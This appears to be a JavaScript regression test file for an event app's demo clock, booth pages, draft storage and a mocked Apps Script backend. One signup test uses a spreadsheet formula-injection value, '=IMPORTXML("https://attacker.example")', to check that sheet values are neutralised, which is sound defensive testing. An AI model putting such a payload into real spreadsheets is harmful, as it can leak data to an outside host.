  assert.equal(dataResetEvents[0].type, "eventapp:data-reset");
  assert.deepEqual({ ...dataResetEvents[0].detail }, { dataResetAt: "initial", changed: false });

  const synchronizedAt = Date.now();
  assert.equal(demoSchedule.applyDemoClock({
    serverNow: "2026-07-18T20:35:00.000Z",
    mode: "session2",
    controlled: true,
    targetIso: "2026-07-18T20:35:00.000Z",
    updatedAt: "2026-07-15T11:00:00.000Z",
    dataResetAt: "initial",
  }, synchronizedAt, synchronizedAt), true);
  assert.equal(demoSchedule.current().sessionIndex, 1);
  assert.equal(demoSchedule.isPreviewing(), true);
  assert.equal(demoSchedule.linkWithPreview("../done/index.html"), "../done/index.html");
  assert.equal(dataResetEvents.length, 2, "every accepted clock sample should announce reset state");
  assert.equal(dataResetEvents[1].detail.changed, false);
  assert.equal(demoSchedule.applyDemoClock({
    serverNow: "2026-07-18T20:42:17.000Z",
    mode: "custom",
    controlled: true,
    targetIso: "2026-07-18T20:42:17.000Z",
    updatedAt: "2026-07-15T11:30:00.000Z",
    dataResetAt: "2026-07-15T11:20:00.000Z",
  }, synchronizedAt, synchronizedAt), true);
  assert.equal(demoSchedule.current().sessionIndex, 1);
  assert.equal(demoSchedule.demoClockState().mode, "custom");
  assert.equal(demoSchedule.demoClockState().dataResetAt, "2026-07-15T11:20:00.000Z");
  assert.equal(dataResetEvents.length, 3);
  assert.deepEqual({ ...dataResetEvents[dataResetEvents.length - 1].detail }, {
    dataResetAt: "2026-07-15T11:20:00.000Z",
    changed: true,
  });
  assert.equal(
    demoSchedule.sync("2026-07-18T20:15:00.000Z", synchronizedAt, synchronizedAt),
    false,
    "generic API clock samples must not override organizer-controlled demo time"
  );
  assert.equal(demoSchedule.current().sessionIndex, 1);
  assert.equal(demoSchedule.applyDemoClock({
    serverNow: "2026-07-18T20:15:00.000Z",
    mode: "session1",
    controlled: true,
    targetIso: "2026-07-18T20:15:00.000Z",
    updatedAt: "2026-07-15T10:30:00.000Z",
    dataResetAt: "initial",
  }, synchronizedAt, synchronizedAt), false, "an older in-flight clock response should not undo organizer control");
  assert.equal(demoSchedule.demoClockState().mode, "custom");

  const pollingRequestA = demoSchedule.refreshDemoClock();
  const pollingRequestB = demoSchedule.refreshDemoClock();
  assert.equal(eventClockCalls, 2, "concurrent refreshes should share one backend request");
  assert.strictEqual(pollingRequestA, pollingRequestB);
  pendingClockResponses.shift()({
    serverNow: "2026-07-18T20:55:00.000Z",
    mode: "waiting",
    controlled: true,
    targetIso: "2026-07-18T20:55:00.000Z",
    updatedAt: "2026-07-15T12:00:00.000Z",
    dataResetAt: "2026-07-15T11:20:00.000Z",
  });
  await pollingRequestA;
  assert.equal(demoSchedule.current().phase, "waiting");
  assert.equal(demoSchedule.current().sessionIndex, null);
  assert.equal(dataResetEvents.length, 4);
  assert.equal(dataResetEvents[3].detail.changed, false);
  assert.equal(demoSchedule.applyDemoClock({
    serverNow: "2026-07-18T20:55:00.000Z",
    mode: "live",
    controlled: true,
    targetIso: null,
    updatedAt: "2026-07-15T12:30:00.000Z",
    dataResetAt: "2026-07-15T11:20:00.000Z",
  }, synchronizedAt, synchronizedAt), true);
  assert.equal(demoSchedule.demoClockState().mode, "live");
  assert.equal(demoSchedule.isPreviewing(), false, "server-controlled live mode must override URL rehearsal previews");
  assert.equal(demoSchedule.current().phase, "waiting");
  assert.equal(demoSchedule.applyDemoClock({
    serverNow: "2026-07-18T20:54:59.000Z",
    mode: "session1",
    controlled: true,
    targetIso: "2026-07-18T20:15:00.000Z",
    updatedAt: "2026-07-15T12:30:00.000Z",
    dataResetAt: "2026-07-15T11:20:00.000Z",
  }, synchronizedAt, synchronizedAt), false, "an older equal-revision sample must not move the clock backward");
  assert.equal(demoSchedule.demoClockState().mode, "live");
  demoSchedule.stopDemoClockSync();
  assert.equal(clearedPollerCount, 1);

  [dashboardSource, artKioskSource, songKioskSource].forEach((source) => {
    assert.match(source, /shared\/phone\.js/);
  });
  const attendeeRooms = {
    "booth-heaven.html": "heaven",
    "booth-trivia.html": "trivia",
    "booth-story.html": "story",
    "booth-art.html": "art",
    "booth-newsong.html": "newsong",
  };
  Object.entries(attendeeRooms).forEach(([filename, boothId]) => {
    const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-booths", filename), "utf8");
    assert.match(source, /shared\/phone\.js/);
    assert.match(source, /shared\/attendee-portal\.js/);
    assert.match(source, /shared\/booth-room\.js/);
    assert.doesNotMatch(source, /id="booth-phone-input"|id="btn-booth-checkin"/);
    assert.match(source, new RegExp(`const BOOTH_ID = "${boothId}"`));
    assert.match(source, /initBoothRoom\(/);
    assert.doesNotMatch(source, /href="hub\.html"|Back to Gym/);
  });

  const boothStaffCommon = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "booth-staff-common.js"), "utf8");
  assert.match(boothStaffCommon, /EventAPI\.boothDashboardData/);
  assert.match(boothStaffCommon, /EventAPI\.updateBoothPresentation/);
  assert.match(boothStaffCommon, /EventSchedule\.groupForBooth/);
  assert.match(boothStaffCommon, /data\.songVotes/);
  assert.doesNotMatch(boothStaffCommon, /EventAPI\.dashboardData\(/);
  ["Get ready", "Show activity", "Hold here", "Finish soon", "End booth"].forEach((label) => {
    assert.ok(!boothStaffCommon.includes(`label: "${label}"`), label);
  });
  assert.doesNotMatch(boothStaffCommon, /staff-status-choice|staff-status-options|data-status/);
  assert.match(boothStaffCommon, /Use Back or Next to change every attendee phone/);
  assert.match(boothStaffCommon, /else if \(stepIndex >= steps\.length - 1\)[\s\S]*?steps\.length - 2/);
  assert.match(boothStaffCommon, /class="booth-leader-dock"/);
  assert.match(boothStaffCommon, /id="btn-staff-next">Next →<\/button>/);
  assert.doesNotMatch(boothStaffCommon, /Publish previous|Publish next|Save to attendee screen|Reset controls/);
  assert.doesNotMatch(boothStaffCommon, /staff-message|Update announcement|Short announcement/);
  assert.match(boothStaffCommon, /async function recoverPresentationConflict\(/);
  assert.match(boothStaffCommon, /samePublishedScreen\(latest, intended\)/);
  assert.match(boothStaffCommon, /Your change is still selected—tap the fixed Apply my change button/);
  assert.match(boothStaffCommon, /if \(conflictRecoveryPending\) \{[\s\S]*?savePresentation\(\);[\s\S]*?return;/);
  assert.match(boothStaffCommon, /nextButton\.textContent = conflictRecoveryPending \? "Apply my change" : "Next →"/);
  assert.match(boothStaffCommon, /conflictRecoveryPending = true;[\s\S]*?tap Apply my change to try again/);
  assert.doesNotMatch(storyAttendeeSource, /story-announcement|function announcement\(|raw\.message/);
  assert.doesNotMatch(storyRoomSource, /story-announcement/);
  assert.match(phase2Source, /message\.textContent = booth\.id === "story" \? ""/);
  assert.match(phase2Source, /message\.style\.display = booth\.id !== "story"/);
  [triviaStaffSource, heavenStaffSource, artStaffSource, newSongStaffControllerSource].forEach((source) => {
    assert.match(source, /class="booth-leader-dock"/);
    assert.ok(source.includes("Next →"));
    assert.doesNotMatch(source, /staff-status-choice|staff-status-options|data-status/);
  });
  [storyAttendeeSource, triviaAttendeeSource, heavenAttendeeSource, artAttendeeSource, newSongAttendeeSource].forEach((source) => {
    assert.match(source, /Finish booth →/);
    assert.doesNotMatch(source, /Done — return to my schedule/);
  });
  ["story"].forEach((boothId) => {
    const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", `${boothId}.html`), "utf8");
    assert.match(source, new RegExp(`initBoothStaff\\("${boothId}"\\)`));
    assert.match(source, /id="staff-settings"/);
  });
  assert.doesNotMatch(newSongStaffPageSource, /booth-staff-common\.js|staff-song-vote-table/);
  ["trivia", "heaven", "story", "art", "newsong"].forEach((boothId) => {
    const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", `${boothId}.html`), "utf8");
    assert.match(source, /shared\/staff-session-alert\.js/, boothId);
  });

  const gasSource = fs.readFileSync(path.join(__dirname, "..", "..", "apps-script", "Code.gs"), "utf8");
  const gasSongListMatch = gasSource.match(/const NEW_SONG_CHOICES = \[([\s\S]*?)\];/);
  assert.ok(gasSongListMatch);
  assert.deepEqual(
    Array.from(vm.runInNewContext(`[${gasSongListMatch[1]}]`)),
    Array.from(EXPECTED_NEW_SONG_CHOICES)
  );
  const gasOverallDashboardBlock = gasSource.slice(
    gasSource.indexOf("function actionDashboardData"),
    gasSource.indexOf("function actionBoothPresentation")
  );
  assert.doesNotMatch(gasOverallDashboardBlock, /triviaLeaderboard|songVotes/);
  assert.equal((gasSource.match(/LockService\.getScriptLock\(\)/g) || []).length, 1);
  assert.match(gasSource, /nextRaffleNumber\(lock\)/);
  assert.doesNotMatch(gasSource, /function nextRaffleNumber\(\)/);
}

function runBoothDraftPersistenceRegression() {
  const values = new Map();
  const storage = {
    getItem(key) { return values.has(key) ? values.get(key) : null; },
    setItem(key, value) { values.set(key, String(value)); },
    removeItem(key) { values.delete(key); },
  };
  let activeAttendeeId = "draft-attendee-a";
  const context = {
    localStorage: storage,
    Identity: { peek: () => ({ attendeeId: activeAttendeeId }) },
  };
  vm.createContext(context);
  const journeySource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "shared", "journey-state.js"),
    "utf8"
  );
  vm.runInContext(`${journeySource}\nthis.__journeyState = JourneyState;`, context);
  const journey = context.__journeyState;

  assert.equal(journey.save("booth.story.activity", { index: 2, drafts: { reflect: "Hope" } }), true);
  let loaded = journey.load("booth.story.activity", {});
  assert.equal(loaded.index, 2);
  assert.equal(loaded.drafts.reflect, "Hope");
  loaded.drafts.reflect = "mutated outside the store";
  assert.equal(journey.load("booth.story.activity", {}).drafts.reflect, "Hope");

  activeAttendeeId = "draft-attendee-b";
  assert.equal(journey.load("booth.story.activity", null), null);
  journey.save("booth.story.activity", { index: 1, drafts: { reflect: "Joy" } });
  activeAttendeeId = "draft-attendee-a";
  assert.equal(journey.load("booth.story.activity", {}).index, 2);
  journey.remove("booth.story.activity");
  assert.equal(journey.load("booth.story.activity", null), null);

  const boothCommonSource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "shared", "booth-common.js"),
    "utf8"
  );
  assert.doesNotMatch(boothCommonSource, /boothFooterDraftScope|_boothStars|paintBoothStars/);
  assert.doesNotMatch(boothCommonSource, /["']booth-(?:note|stars)["']/);
  assert.doesNotMatch(boothCommonSource, /\brating\s*:|\bnote\s*:/);

  // The Heaven Booth is now leader-paced. Its shared presentation is restored
  // from the backend, so a local draft must never override the published step.
  const storySource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-story.html"),
    "utf8"
  );
  assert.doesNotMatch(
    storySource,
    /_DRAFT_SCOPE|STORY_BEATS|JourneyState\.(?:load|save)\(|renderBoothFooter\(|btn-story-(?:next|prev)/
  );
  assert.match(storySource, /shared\/story-attendee\.js/);

  // Bible Bowl is the deliberate exception: answers and score restoration
  // are authoritative on the server, so the attendee page must not revive a
  // stale self-paced JourneyState draft or the generic rating/footer flow.
  const triviaSource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-trivia.html"),
    "utf8"
  );
  assert.doesNotMatch(triviaSource, /_DRAFT_SCOPE|JourneyState\.(?:load|save)\(|renderBoothFooter\(/);
  assert.match(triviaSource, /shared\/trivia-attendee\.js/);

  // Draw Heaven is the same kind of deliberate exception. Its active run and
  // five confirmations restore from the backend; local JourneyState is used
  // only by the shared controller for one-time decorative motion per run.
  const heavenSource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-heaven.html"),
    "utf8"
  );
  assert.doesNotMatch(heavenSource, /_DRAFT_SCOPE|setHeavenPage|JourneyState\.(?:load|save)\(|renderBoothFooter\(/);
  assert.match(heavenSource, /shared\/heaven-attendee\.js/);

  // Art Therapy is paced entirely by its leader too. Refresh restoration is
  // authoritative on the active session/run; no old reflection draft or
  // self-paced slide index can override the current published phase.
  const artSource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-art.html"),
    "utf8"
  );
  assert.doesNotMatch(
    artSource,
    /_DRAFT_SCOPE|ART_BEATS|JourneyState\.(?:load|save)\(|renderBoothFooter\(|btn-art-(?:next|prev)/
  );
  assert.match(artSource, /shared\/art-attendee\.js/);

  // New Song restores its active run and locked vote from the backend too.
  // It does not revive the old local poll index or generic rating footer.
  const newSongSource = fs.readFileSync(
    path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-newsong.html"),
    "utf8"
  );
  assert.doesNotMatch(newSongSource, /_DRAFT_SCOPE|JourneyState\.(?:load|save)\(|renderBoothFooter\(/);
  assert.match(newSongSource, /shared\/newsong-attendee\.js/);
}

function runAppsScriptRegression() {
  class MockSheet {
    constructor() {
      this.rows = [];
      this.maxRows = 1000;
      this.maxColumns = 26;
      this.failNextSetValues = false;
    }
    ensureCell(row, column) {
      while (this.rows.length < row) this.rows.push([]);
      while (this.rows[row - 1].length < column) this.rows[row - 1].push("");
    }
    appendRow(values) { this.rows.push(values.slice()); }
    setFrozenRows() {}
    getDataRange() {
      return { getValues: () => this.rows.map((row) => row.slice()) };
    }
    getMaxRows() { return this.maxRows; }
    getMaxColumns() { return this.maxColumns; }
    insertRowsAfter(_afterPosition, howMany) { this.maxRows += howMany; }
    insertColumnsAfter(_afterPosition, howMany) { this.maxColumns += howMany; }
    getLastRow() {
      let last = 0;
      this.rows.forEach((row, index) => {
        if (row.some((value) => value !== "" && value !== null && value !== undefined)) last = index + 1;
      });
      return last;
    }
    getLastColumn() {
      let last = 0;
      this.rows.forEach((row) => {
        row.forEach((value, index) => {
          if (value !== "" && value !== null && value !== undefined) last = Math.max(last, index + 1);
        });
      });
      return last;
    }
    getRange(row, column, rowCount = 1, columnCount = 1) {
      const sheet = this;
      return {
        setValue(value) {
          sheet.ensureCell(row, column);
          sheet.rows[row - 1][column - 1] = value;
          return this;
        },
        setValues(values) {
          if (sheet.failNextSetValues) {
            sheet.failNextSetValues = false;
            throw new Error("mock setValues failed");
          }
          assert.equal(values.length, rowCount);
          values.forEach((valuesRow, rowIndex) => {
            assert.equal(valuesRow.length, columnCount);
            valuesRow.forEach((value, columnIndex) => {
              sheet.ensureCell(row + rowIndex, column + columnIndex);
              sheet.rows[row - 1 + rowIndex][column - 1 + columnIndex] = value;
            });
          });
          return this;
        },
        clearContent() {
          for (let rowOffset = 0; rowOffset < rowCount; rowOffset += 1) {
            for (let columnOffset = 0; columnOffset < columnCount; columnOffset += 1) {
              sheet.ensureCell(row + rowOffset, column + columnOffset);
              sheet.rows[row - 1 + rowOffset][column - 1 + columnOffset] = "";
            }
          }
          return this;
        },
      };
    }
    deleteRow(row) { this.rows.splice(row - 1, 1); }
  }

  class MockSpreadsheet {
    constructor() { this.sheets = new Map(); }
    getSheetByName(name) { return this.sheets.get(name) || null; }
    insertSheet(name) {
      const sheet = new MockSheet();
      this.sheets.set(name, sheet);
      return sheet;
    }
  }

  const spreadsheet = new MockSpreadsheet();
  const lockState = { held: false, acquisitions: 0, releases: 0 };
  let flushShouldThrow = false;
  let uuidCounter = 0;
  const gasContext = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => spreadsheet,
      flush: () => {
        if (flushShouldThrow) throw new Error("flush failed");
      },
    },
    LockService: {
      getScriptLock: () => {
        let acquired = false;
        return {
          waitLock: () => {
            if (lockState.held) throw new Error("nested lock acquisition");
            lockState.held = true;
            lockState.acquisitions += 1;
            acquired = true;
          },
          hasLock: () => acquired && lockState.held,
          releaseLock: () => {
            if (acquired) {
              lockState.held = false;
              lockState.releases += 1;
              acquired = false;
            }
          },
        };
      },
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (key) => {
          if (key === "ORGANIZER_KEY") return "gas-organizer-key";
          if (key === "EXPORT_KEY") return "gas-export-key";
          return null;
        },
      }),
    },
    Utilities: { getUuid: () => `gas-id-${++uuidCounter}` },
    ContentService: {
      MimeType: { JSON: "json" },
      createTextOutput: (content) => ({
        content,
        mimeType: null,
        setMimeType(mimeType) { this.mimeType = mimeType; return this; },
      }),
    },
  };
  vm.createContext(gasContext);
  const gasSource = fs.readFileSync(path.join(__dirname, "..", "..", "apps-script", "Code.gs"), "utf8");
  vm.runInContext(`${gasSource}\nthis.__gas = {
    actionRegisterAttendee,
    actionConfirmWristband,
    actionLoginAttendee,
    actionAttendeePortalSession,
    actionFindOrRegisterByPhone,
    actionBoothCheckin,
    actionSaveSongVote,
    actionSubmitSignup,
    actionSaveSignupSelections,
    actionConfirmSignupInPerson,
    actionDashboardData,
    actionBoothPresentation,
    actionUpdateBoothPresentation,
    actionBoothDashboardData,
    actionImportNodeSnapshot,
    actionMyCheckins,
    actionMySignupSelections,
    nodeExportSchemas: NODE_EXPORT_SCHEMAS,
    sheetSafeValue,
    nextRaffleNumber,
    withScriptLock,
    doPost
  };`, gasContext);
  const gas = gasContext.__gas;

  let result = gas.actionRegisterAttendee({ attendeeId: "gas-entry-a", name: "Avery" });
  assert.equal(result.raffleNumber, "1001");
  assert.equal(result.isNew, true);
  assert.equal(lockState.acquisitions, 1);
  assert.equal(lockState.releases, 1);
  result = gas.actionRegisterAttendee({ attendeeId: "gas-entry-a", name: "Avery" });
  assert.equal(result.isNew, false);

  assert.throws(
    () => gas.actionLoginAttendee({ name: " aVeRy ", phone: "6155550101", portal: "phase3" }),
    (error) => error.code === "ATTENDEE_LOGIN_FAILED"
  );
  assert.throws(
    () => gas.actionLoginAttendee({ name: "Wrong", phone: "6155550101", portal: "phase3" }),
    (error) => error.code === "ATTENDEE_LOGIN_FAILED"
  );

  const beforeUnauthorized = lockState.acquisitions;
  assert.throws(
    () => gas.actionFindOrRegisterByPhone({ phone: "6155550909", allowCreate: true, organizerKey: "wrong" }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  assert.equal(lockState.acquisitions, beforeUnauthorized);

  for (const invalidPhone of ["615555010", "16155550101"]) {
    const beforeInvalidPhone = lockState.acquisitions;
    assert.throws(
      () => gas.actionFindOrRegisterByPhone({
        phone: invalidPhone,
        allowCreate: true,
        organizerKey: "gas-organizer-key",
      }),
      (error) => error.code === "INVALID_PHONE"
    );
    assert.equal(lockState.acquisitions, beforeInvalidPhone);
  }

  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550101",
    raffleNumber: "1001",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.requiresPairingConfirmation, true);
  const gasAttendeeSheet = spreadsheet.getSheetByName("Attendees");
  const gasPhoneColumn = gasAttendeeSheet.rows[0].indexOf("phone");
  const gasPhase3CompletedAtColumn = gasAttendeeSheet.rows[0].indexOf("phase3CompletedAt");
  assert.notEqual(gasPhase3CompletedAtColumn, -1);
  assert.equal(gasAttendeeSheet.rows[1][gasPhoneColumn], "");
  assert.equal(gasAttendeeSheet.rows[1][gasPhase3CompletedAtColumn], "");
  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550101",
    raffleNumber: "1001",
    confirmPairing: true,
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.attendeeId, "gas-entry-a");
  assert.equal(result.raffleNumber, "1001");
  assert.throws(
    () => gas.actionLoginAttendee({ name: " aVeRy ", phone: "6155550101", portal: "phase2" }),
    (error) => error.code === "PHASE1_INCOMPLETE"
  );
  result = gas.actionLoginAttendee({ name: " aVeRy ", phone: "6155550101", portal: "phase3" });
  assert.equal(result.attendeeId, "gas-entry-a");
  assert.equal(result.wristbandColor, null);
  assert.equal(result.phoneLinked, true);
  assert.equal(result.phase3CompletedAt, null);
  assertIsoTimestamp(result.serverNow, "Apps Script attendee serverNow");
  assert.equal("phone" in result, false);

  const beforeAttendeeDependentWrites = lockState.acquisitions;
  assert.throws(
    () => gas.actionConfirmWristband({ attendeeId: "gas-entry-a" }),
    (error) => error.code === "INVALID_WRISTBAND_COLOR"
  );
  assert.throws(
    () => gas.actionConfirmWristband({ attendeeId: "gas-entry-a", wristbandColor: "purple" }),
    (error) => error.code === "INVALID_WRISTBAND_COLOR"
  );
  assert.equal(lockState.acquisitions, beforeAttendeeDependentWrites);
  result = gas.actionConfirmWristband({ attendeeId: "gas-entry-a", wristbandColor: " BLUE " });
  assert.equal(result.wristbandColor, "blue");
  const gasSignup = gas.actionSubmitSignup({
    attendeeId: "gas-entry-a",
    phone: "6155550101",
    optionId: "formula-test",
    optionTitle: "=IMPORTXML(\"https://attacker.example\")",
  });
  gas.actionConfirmSignupInPerson({
    signupId: gasSignup.signupId,
    confirmedBy: "staff",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(lockState.acquisitions, beforeAttendeeDependentWrites + 3);
  result = gas.actionLoginAttendee({ name: "Avery", phone: "6155550101", portal: "phase2" });
  assert.equal(result.wristbandConfirmed, true);
  assert.equal(result.wristbandColor, "blue");
  assertIsoTimestamp(result.serverNow, "Apps Script Phase 2 login serverNow");
  result = gas.actionAttendeePortalSession({ attendeeId: "gas-entry-a", portal: "phase2" });
  assert.equal(result.attendeeId, "gas-entry-a");
  assert.equal(result.wristbandColor, "blue");
  assert.equal(result.phase3CompletedAt, null);
  assertIsoTimestamp(result.serverNow, "Apps Script restored session serverNow");

  const duplicateGasSignup = gas.actionSubmitSignup({
    attendeeId: "gas-entry-a",
    phone: "(615) 555-0101",
    optionId: "formula-test",
    optionTitle: "=IMPORTXML(\"https://attacker.example\")",
  });
  assert.equal(duplicateGasSignup.signupId, gasSignup.signupId);
  assert.equal(duplicateGasSignup.updated, true);
  result = gas.actionMySignupSelections({ attendeeId: "gas-entry-a" });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.equal(result.completedAt, null);
  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: [] });
  assert.deepEqual(Array.from(result.optionIds), []);
  assertIsoTimestamp(result.completedAt, "Apps Script Phase 3 empty-save completedAt");
  const gasPhase3CompletedAt = result.completedAt;
  result = gas.actionMySignupSelections({ attendeeId: "gas-entry-a" });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.equal(result.completedAt, gasPhase3CompletedAt);
  result = gas.actionAttendeePortalSession({ attendeeId: "gas-entry-a", portal: "phase3" });
  assert.equal(result.phase3CompletedAt, gasPhase3CompletedAt);
  result = gas.actionSaveSignupSelections({
    attendeeId: "gas-entry-a",
    optionIds: ["future", "art", "future"],
  });
  assert.deepEqual(Array.from(result.optionIds), ["future", "art"]);
  assert.equal(result.completedAt, gasPhase3CompletedAt);
  const gasArtSignupId = result.signupIds[1];
  result = gas.actionMySignupSelections({ attendeeId: "gas-entry-a" });
  assert.deepEqual(Array.from(result.optionIds), ["future", "art"]);
  assert.equal(result.completedAt, gasPhase3CompletedAt);
  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: ["art"] });
  assert.deepEqual(Array.from(result.optionIds), ["art"]);
  assert.equal(result.signupIds[0], gasArtSignupId);
  assert.equal(result.completedAt, gasPhase3CompletedAt);
  result = gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: [] });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.equal(result.completedAt, gasPhase3CompletedAt);
  result = gas.actionMySignupSelections({ attendeeId: "gas-entry-a" });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.equal(result.completedAt, gasPhase3CompletedAt);
  assert.throws(
    () => gas.actionSaveSignupSelections({ attendeeId: "gas-entry-a", optionIds: ["invalid"] }),
    (error) => error.code === "INVALID_SIGNUP_OPTIONS"
  );
  assert.equal(gas.sheetSafeValue("=SUM(1,2)"), "'=SUM(1,2)");
  assert.equal(gas.sheetSafeValue("  =SUM(1,2)"), "'  =SUM(1,2)");
  assert.equal(gas.sheetSafeValue("\t=SUM(1,2)"), "'\t=SUM(1,2)");
  assert.equal(gas.sheetSafeValue("\r@SUM(1,2)"), "'\r@SUM(1,2)");
  const signupSheet = spreadsheet.getSheetByName("SignUps");
  const optionTitleColumn = signupSheet.rows[0].indexOf("optionTitle");
  assert.match(signupSheet.rows[1][optionTitleColumn], /^'/);

  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550202",
    allowCreate: true,
    organizerKey: "gas-organizer-key",
  });
  const kioskId = result.attendeeId;
  assert.equal(result.raffleNumber, "1002");
  gas.actionBoothCheckin({
    attendeeId: kioskId,
    phone: "6155550202",
    boothId: "newsong",
    checkedInBy: "staff-kiosk",
    organizerKey: "gas-organizer-key",
  });
  result = gas.actionSaveSongVote({ attendeeId: kioskId, songTitle: "Victory" });
  assert.equal(result.votes, 1);
  assert.equal(result.totalVotes, 1);
  result = gas.actionSaveSongVote({ attendeeId: kioskId, songTitle: "Victory" });
  assert.equal(result.votes, 1);
  assert.equal(result.totalVotes, 1);
  result = gas.actionMySignupSelections({ attendeeId: kioskId });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.equal(result.completedAt, null);
  result = gas.actionSaveSignupSelections({ attendeeId: kioskId, optionIds: [] });
  assertIsoTimestamp(result.completedAt, "Apps Script merged attendee Phase 3 completedAt");
  const gasKioskPhase3CompletedAt = result.completedAt;

  result = gas.actionRegisterAttendee({ attendeeId: "gas-entry-c", name: "Casey" });
  assert.equal(result.raffleNumber, "1003");
  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550202",
    raffleNumber: "1003",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.requiresPairingConfirmation, true);
  assert.equal(spreadsheet.getSheetByName("Attendees").rows.length, 4);
  result = gas.actionFindOrRegisterByPhone({
    phone: "6155550202",
    raffleNumber: "1003",
    confirmPairing: true,
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.attendeeId, "gas-entry-c");
  assert.equal(result.raffleNumber, "1003");

  const attendeeSheet = spreadsheet.getSheetByName("Attendees");
  assert.equal(attendeeSheet.rows.length, 3); // header + Avery + Casey
  const gasAttendeeIdColumn = attendeeSheet.rows[0].indexOf("attendeeId");
  const caseyRow = attendeeSheet.rows.find((row) => row[gasAttendeeIdColumn] === "gas-entry-c");
  assert.equal(caseyRow[gasPhase3CompletedAtColumn], gasKioskPhase3CompletedAt);
  const checkinSheet = spreadsheet.getSheetByName("BoothCheckins");
  const checkinHeaders = checkinSheet.rows[0];
  const attendeeIdColumn = checkinHeaders.indexOf("attendeeId");
  assert.equal(checkinSheet.rows[1][attendeeIdColumn], "gas-entry-c");
  const songVoteSheet = spreadsheet.getSheetByName("SongVotes");
  const songVoteAttendeeIdColumn = songVoteSheet.rows[0].indexOf("attendeeId");
  assert.equal(songVoteSheet.rows.length, 2);
  assert.equal(songVoteSheet.rows[1][songVoteAttendeeIdColumn], "gas-entry-c");
  const originalNewsongCheckinId = checkinSheet.rows[1][checkinHeaders.indexOf("id")];
  const checkedInAtColumn = checkinHeaders.indexOf("checkedInAt");
  const originalNewsongCheckedInAt = "2026-07-18T20:10:00.000Z";
  checkinSheet.rows[1][checkedInAtColumn] = originalNewsongCheckedInAt;
  result = gas.actionBoothCheckin({
    attendeeId: "gas-entry-c",
    phone: "6155550202",
    boothId: "newsong",
    boothName: "The New Song in Nashville",
    checkedInBy: "self",
    rating: 5,
  });
  assert.equal(result.checkinId, originalNewsongCheckinId);
  assert.equal(result.updated, true);
  assert.equal(checkinSheet.rows.length, 2);
  assert.equal(checkinSheet.rows[1][checkinHeaders.indexOf("rating")], 5);
  assert.equal(checkinSheet.rows[1][checkedInAtColumn], originalNewsongCheckedInAt);
  result = gas.actionMyCheckins({ attendeeId: kioskId });
  assert.deepEqual(Array.from(result.boothIds), ["newsong"]);
  result = gas.actionMySignupSelections({ attendeeId: kioskId });
  assert.deepEqual(Array.from(result.optionIds), []);
  assert.equal(result.completedAt, gasKioskPhase3CompletedAt);

  result = gas.actionBoothPresentation({ boothId: "art" });
  assert.equal(result.boothId, "art");
  assert.equal(result.stepIndex, 0);
  assert.equal(result.status, "waiting");
  assert.equal(result.message, "");
  assert.equal(result.version, 0);
  assertIsoTimestamp(result.serverNow, "Apps Script booth serverNow");
  assert.throws(
    () => gas.actionBoothPresentation({ boothId: "unknown" }),
    (error) => error.code === "BOOTH_NOT_FOUND"
  );

  result = gas.actionUpdateBoothPresentation({
    boothId: "story",
    stepIndex: 1,
    status: "live",
    message: "This should not appear.",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.message, "", "The Apps Script adapter must suppress Heaven Booth announcements");
  result = gas.actionBoothPresentation({ boothId: "story" });
  assert.equal(result.message, "");
  const boothControlsSheet = spreadsheet.getSheetByName("BoothControls");
  const boothControlsMessageColumn = boothControlsSheet.rows[0].indexOf("message");
  const boothControlsIdColumn = boothControlsSheet.rows[0].indexOf("boothId");
  const storyControlRow = boothControlsSheet.rows.find((row) => row[boothControlsIdColumn] === "story");
  assert.equal(storyControlRow[boothControlsMessageColumn], "");

  const beforePresentationWrites = lockState.acquisitions;
  assert.throws(
    () => gas.actionUpdateBoothPresentation({
      boothId: "art", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
    }),
    (error) => error.code === "AUTH_REQUIRED"
  );
  assert.throws(
    () => gas.actionUpdateBoothPresentation({
      boothId: "art", stepIndex: 1, status: "invalid", message: "Begin", organizerKey: "gas-organizer-key",
    }),
    (error) => error.code === "INVALID_PRESENTATION_STATUS"
  );
  assert.equal(lockState.acquisitions, beforePresentationWrites);
  result = gas.actionUpdateBoothPresentation({
    boothId: "art",
    stepIndex: 2,
    status: "live",
    message: "  Start drawing now.  ",
    organizerKey: "gas-organizer-key",
  });
  assert.equal(result.version, 1);
  assert.equal(result.message, "Start drawing now.");
  assert.equal(result.status, "live");
  assertIsoTimestamp(result.createdAt, "Apps Script presentation createdAt");
  const gasPresentationCreatedAt = result.createdAt;
  assert.throws(
    () => gas.actionUpdateBoothPresentation({
      boothId: "art",
      stepIndex: 4,
      status: "wrap",
      message: "Stale",
      version: 0,
      organizerKey: "gas-organizer-key",
    }),
    (error) => error.code === "PRESENTATION_CONFLICT"
  );
